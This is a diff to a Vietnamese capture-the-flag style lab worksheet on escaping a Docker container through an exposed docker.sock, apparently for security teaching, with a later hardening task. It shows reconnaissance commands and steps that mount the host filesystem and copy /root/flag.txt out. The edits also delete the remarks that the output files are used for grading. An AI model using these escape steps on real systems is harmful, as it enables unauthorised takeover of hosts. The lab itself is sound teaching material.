@@ -90,7 +90,7 @@ Sau khi chứng minh được đường tấn công, sinh viên đổi vai thàn
 | `/proc/1/cgroup`, `/proc/self/status` | Cho biết đang ở trong container và tập capability hiệu lực (dòng `CapEff`). Dấu hiệu trinh sát đầu tiên. |
 | `/var/run/docker.sock` (trên `app`) | Socket điều khiển Docker daemon; nếu bị lộ vào container = chìa khoá chiếm host. |
 | `CapEff` chứa cờ tương ứng `CAP_SYS_ADMIN` / block device host trong `/dev` (nếu có) | Dấu hiệu bổ trợ cho thấy container được cấp quyền thừa. |
-| `host-sim` — `/root/flag.txt` | Vùng chỉ truy cập được **sau khi escape**; chứa flag chấm điểm. |
+| `host-sim` — `/root/flag.txt` | Vùng chỉ truy cập được **sau khi escape**; chứa flag mục tiêu. |
 | Cấu hình `docker run` an toàn (nhiệm vụ hardening) | Sản phẩm phòng thủ: lệnh khởi chạy container đã được vá lỗ hổng. |
 
 ### Bảng công cụ & cú pháp
@@ -155,7 +155,7 @@ fdisk -l 2>/dev/null
 lsblk 2>/dev/null
 ```
 
-**Bước 5:** Ghi lại các phát hiện vào một file trong thư mục cá nhân để tiện đối chiếu (file này cũng được dùng để chấm điểm):
+**Bước 5:** Ghi lại các phát hiện vào một file trong thư mục cá nhân để tiện đối chiếu:
 ```bash
 { echo "=== cgroup ==="; cat /proc/1/cgroup;
   echo "=== CapEff ==="; grep -i cap /proc/self/status;
@@ -195,7 +195,7 @@ docker -H unix:///var/run/docker.sock ps
 ```
 (thay `<IMAGE>` bằng image xuất hiện ở Bước 2). Container `esc` chạy nền và có toàn bộ rootfs host nằm tại `/host`.
 
-> **Lưu ý (quan trọng để lấy output ổn định):** `/var/run/docker.sock` ở đây được nối tới daemon host qua proxy, nên lệnh `docker run` **chạy nền (`-d`)** rồi dùng `docker cp`/`docker logs` để lấy dữ liệu sẽ ổn định hơn so với `docker run` tương tác (`-it`) hay in thẳng ra terminal.
+> **Lưu ý:** Để lấy dữ liệu từ host ổn định, nên tạo container **chạy nền (`-d`)** rồi dùng `docker cp` (hoặc `docker logs`) để trích xuất, thay vì `docker run` tương tác (`-it`).
 
 **Bước 4:** Lấy bằng chứng escape (canary chỉ tồn tại trên host) từ container `esc` bằng `docker cp` và lưu vào thư mục cá nhân:
 ```bash
@@ -244,7 +244,7 @@ Trả lời: _______________________________________
 
 **Mục tiêu:** Dùng quyền truy cập host vừa giành được ở Nhiệm vụ 2 để đọc tập tin bí mật `/root/flag.txt` trên host — bằng chứng escape thành công.
 
-**Bước 1:** Đọc flag qua container tạm mount rootfs host, lưu ra file kết quả trong thư mục cá nhân để phục vụ chấm điểm:
+**Bước 1:** Lấy flag từ `/root/flag.txt` của host (qua container `esc` đã mount rootfs host) và lưu ra file kết quả trong thư mục cá nhân:
 ```bash
 docker -H unix:///var/run/docker.sock cp esc:/host/root/flag.txt ~/flag_result.txt
 cat ~/flag_result.txt
